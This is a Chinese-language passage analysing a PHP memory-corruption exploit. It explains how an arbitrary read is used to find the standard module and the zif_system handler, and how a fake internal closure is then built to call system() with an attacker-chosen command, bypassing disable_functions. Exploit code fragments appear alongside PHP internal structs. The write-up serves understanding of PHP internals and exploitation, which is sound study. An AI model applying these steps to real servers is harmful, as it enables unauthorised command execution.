此时达到了任意地址读的目的，然后就是读取helper->b的匿名函数`_zend_object`的偏移0x10处的值，即`zend_object.ce;`，是类的描述结构`zend_class_entry`的地址。该结构内部包含方法所属类名，父类名，各种魔术方法等。
    struct _zend_class_entry {
        char type;
        zend_string *name;
        /* class_entry or string depending on ZEND_ACC_LINKED */
        union {
            zend_class_entry *parent;
            zend_string *parent_name;
        };
        int refcount;
        uint32_t ce_flags;
        int default_properties_count;
        int default_static_members_count;
        zval *default_properties_table;
        zval *default_static_members_table;
        ZEND_MAP_PTR_DEF(zval *, static_members_table);
        HashTable function_table;
        HashTable properties_info;
        HashTable constants_table;
        struct _zend_property_info **properties_info_table;
        zend_function *constructor;
        zend_function *destructor;
        zend_function *clone;
        zend_function *__get;
        zend_function *__set;
        zend_function *__unset;
        zend_function *__isset;
        zend_function *__call;
        zend_function *__callstatic;
        zend_function *__tostring;
        zend_function *__debugInfo;
        zend_function *serialize_func;
        zend_function *unserialize_func;
        /* allocated only if class implements Iterator or IteratorAggregate interface */
        zend_class_iterator_funcs *iterator_funcs_ptr;
        /* handlers */
        union {
            zend_object* (*create_object)(zend_class_entry *class_type);
            int (*interface_gets_implemented)(zend_class_entry *iface, zend_class_entry *class_type); /* a class implements this interface */
        };
        zend_object_iterator *(*get_iterator)(zend_class_entry *ce, zval *object, int by_ref);
        zend_function *(*get_static_method)(zend_class_entry *ce, zend_string* method);
        /* serializer callbacks */
        int (*serialize)(zval *object, unsigned char **buffer, size_t *buf_len, zend_serialize_data *data);
        int (*unserialize)(zval *object, zend_class_entry *ce, const unsigned char *buf, size_t buf_len, zend_unserialize_data *data);
        uint32_t num_interfaces;
        uint32_t num_traits;
        /* class_entry or string(s) depending on ZEND_ACC_LINKED */
        union {
            zend_class_entry **interfaces;
            zend_class_name *interface_names;
        };
        zend_class_name *trait_names;
        zend_trait_alias **trait_aliases;
        zend_trait_precedence **trait_precedences;
        union {
            struct {
                zend_string *filename;
                uint32_t line_start;
                uint32_t line_end;
                zend_string *doc_comment;
            } user;
            struct {
                const struct _zend_function_entry *builtin_functions;
                struct _zend_module_entry *module;
            } internal;
        } info;
    };
再者是获取函数基地址,
    $basic_funcs = $this->get_basic_funcs($closure_ce);
    self::log("basic_functions @ 0x%x", $basic_funcs);
        private function get_basic_funcs($addr) {
            while(true) {
                // In rare instances the standard module might lie after the addr we're starting
                // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
                // In that case, changing the direction of the search should fix the crash.
                // $addr += 0x10;
                $addr -= 0x10;
                if($this->read($addr, 4) === 0xA8 &&
                    in_array($this->read($addr + 4, 4),
                        [20180731, 20190902, 20200930, 20210902])) {
                    $module_name_addr = $this->read($addr + 0x20);
                    $module_name = $this->read($module_name_addr);
                    if($module_name === 0x647261646e617473) {
                        self::log("standard module @ 0x%x", $addr);
                        return $this->read($addr + 0x28);
                    }
                }
            }
        }
读取方法是根据ce的地址，在其前面查找，根据MODULE_API_NO进行验证查找模块结构zend_module_entry
    struct _zend_module_entry {
        unsigned short size;
        unsigned int zend_api;
        unsigned char zend_debug;
        unsigned char zts;
        const struct _zend_ini_entry *ini_entry;
        const struct _zend_module_dep *deps;
        const char *name;
        const struct _zend_function_entry *functions;
        int (*module_startup_func)(INIT_FUNC_ARGS);
        int (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS);
        int (*request_startup_func)(INIT_FUNC_ARGS);
        int (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS);
        void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS);
        const char *version;
        size_t globals_size;
    #ifdef ZTS
        ts_rsrc_id* globals_id_ptr;
    #else
        void* globals_ptr;
    #endif
        void (*globals_ctor)(void *global);
        void (*globals_dtor)(void *global);
        int (*post_deactivate_func)(void);
        int module_started;
        unsigned char type;
        void *handle;
        int module_number;
        const char *build_id;
    };
offset=0处事size，offset=4处是zend_api，一般是20180731、20190902、20200930、20210902中之一，offset=0x20处是模块名name的地址。
为什么可以在ce的附近找到module呢，因为注册闭包函数对应的zend_class_entry是在zend_register_closure_ce函数中。根据watch调试得到，该结构在`do_register_internal_class`中被malloc分配并初始化，在加载启动Core模块时被分配在堆空间中。
调用栈如下：
而`standard`模块的`zend_module_entry`结构在`php_register_internal_extensions_func`注册内部模块时被加载进已注册模块哈希表。使用内存断点得到调用栈：
这里向哈希表中添加内容时，该哈希表的GC位被设置了IS_ARRAY_PERSISTENT，即被分配于系统malloc区内。
所以，ce和module都在堆中，可以慢慢向前查到。校验值是代码中定义的_zend_module_entry标准头。
    #define ZEND_MODULE_API_NO 20190902
    #define STANDARD_MODULE_HEADER_EX sizeof(zend_module_entry), ZEND_MODULE_API_NO, ZEND_DEBUG, USING_ZTS
    zend_module_entry basic_functions_module = { /* {{{ */
        STANDARD_MODULE_HEADER_EX,
        NULL,
        standard_deps,
        "standard",                 /* extension name */
        basic_functions,            /* function list */
        PHP_MINIT(basic),           /* process startup */
        PHP_MSHUTDOWN(basic),       /* process shutdown */
        PHP_RINIT(basic),           /* request startup */
        PHP_RSHUTDOWN(basic),       /* request shutdown */
        PHP_MINFO(basic),           /* extension info */
        PHP_STANDARD_VERSION,       /* extension version */
        STANDARD_MODULE_PROPERTIES
    };
_zend_module_entry偏移为0x24的位置是_zend_function_entry结构的地址，里面存放了该模块所有的函数，其中就包括了`PHP_FE(system,arginfo_system)`
依次读出_zend_function_entry列表里的每一个zend_function_entry结构，为其分配zend_internal_function大小的堆空间，然后拷贝zend_function前面一部分内容。因为zend_function是一个联合体，里面zend_op_array是最大的，所以拷贝前面zend_internal_function大小就可以了。这个新的zend_internal_function结构的指针将会被添加到全局函数表中。我们找到的其实是被全局定义在zend_module_entry的function列表中的basic_functions。
    typedef struct _zend_function_entry {
        const char *fname;
        zif_handler handler;
        const struct _zend_internal_arg_info *arg_info;
        uint32_t num_args;
        uint32_t flags;
    } zend_function_entry;
handler就是真正的函数地址
我们要做的就是将找到的_zend_function_entry结构赋给`zend_function`的handler
    $zif_system = $this->get_system($basic_funcs);
            self::log("zif_system @ 0x%x", $zif_system);
接下来就是构造一个假的闭包函数，让他成为内部函数。
    $fake_closure_off = 0x70;
             for($i = 0; $i rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
             }
             $this->rel_write($fake_closure_off + 0x38, 1, 4);
             $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
             $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
             $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
             self::log("fake closure @ 0x%x", $fake_closure_addr);
             $this->rel_write(0x20, $fake_closure_addr);
             ($this->helper->b)($cmd);
             $this->rel_write(0x20, $closure_addr);
             unset($this->helper->b);
对于`($this->helper->b)($cmd);`类的动态调用，会进入`zend_init_dynamic_call_object`逻辑，获取对象的`get_closure`句柄并调用。
在`zend_init_dynamic_call_object`内，传入的obj指针被强转为`zend_closure`闭包，其实在编译的时候，分配的空间大小就是按照_zend_closure分配的（加上调试信息共需要344B，分配得到17号RUN，384B），其中第一个成员就是_zend_object。
转换为闭包后，能够读取到其对应得`zend_function`、`zend_class_entry`等。
    typedef struct _zend_closure {//312B
        zend_object       std;//56B
        zend_function     func;//224B
        zval              this_ptr;//16B
        zend_class_entry *called_scope;
        zif_handler       orig_internal_handler;//8B typedef void (ZEND_FASTCALL *zif_handler)(INTERNAL_FUNCTION_PARAMETERS)
    } zend_closure;
    //对比
    struct _zend_object {
        zend_refcounted_h gc;//8B
        uint32_t          handle; // TODO: may be removed ???
        zend_class_entry *ce;
        const zend_object_handlers *handlers;
        HashTable        *properties;
        zval              properties_table[1];
    };
数据复制的大概流程是
向`abc`所在的空间即`helper`对象对应的`zend_object`内容的0x70=112的偏移处开始写值（一个zend_object是56字节，这里隔了一个zend_object的空间），数据来源是闭包函数helper->b对应的`zend_object`（或者可以说是`zend_closure`）的内容。共计复制`0x138=312B=sizeof(zend_closure)`的内容。按理来说，这块内存并没有被分配出来，而且规格不对。但是我们能写入的内容只能是在abc内以及abc的后面
`helper`对象对应的`zend_object`内容的0x70=112的偏移处已经是一个新的块的起始位置（helper对应得zend_object占得是abc得空间，包含头只有128字节，写得时候只能从offset+24处开始写，所以offset+0x70就是新的字符串块儿的，原本abc的空间可写长度剩余128-24=104字节，向后跨越112字节，来到了新的128字节存储块的offset+8处，没有从offset+0处开始是保留了这里的空闲链表指针）。
连续向下写0x138=312B的数据，会非法占用abc后面的3个128B的块儿。
复制完后，就更改helper->b对应得zend_object结构的地址，让其指向新的`zend_closure`处。
**为什么不直接更改zend_closure的handler**
我们是任意读，但是受限写，只能写入abc块后面空间。而`zend_closure`在abc前面，所以只能复制到我们能写的地方，然后再处理。
处理一下
    $this->rel_write($fake_closure_off + 0x38, 1, 4);
            $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;//因为主版本的变化，这里的偏移量可能会有所不同，新版本的偏移量我没算
            $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
zend_closure@offset+0x68处是`zend_closure.zend_function.zend_internal_function.zif_handler`，即函数句柄
同时，我们需要改掉一些标志位：
zend_closure@offset+0x38处是`zend_closure.zend_function.zend_internal_function.type`，将其更改为内部函数
    #define ZEND_INTERNAL_FUNCTION              1
修改完新的zend_closure，将其赋给`helper->b`，这样我们就可以对特定standard模块内的函数进行调用了。
调用完后再修改回去，就OK了。
当然，因为我们非法占用了3个128字节的块儿，这些块儿会造成内存泄漏。
还有`this->helper->a`这个字符串，其对应的内容实质上只是一段内存，并不是真正的字符串，其长度会特别大，这个字符串也得修改回来，不过不该也无所谓了，内存泄漏就泄漏吧23333.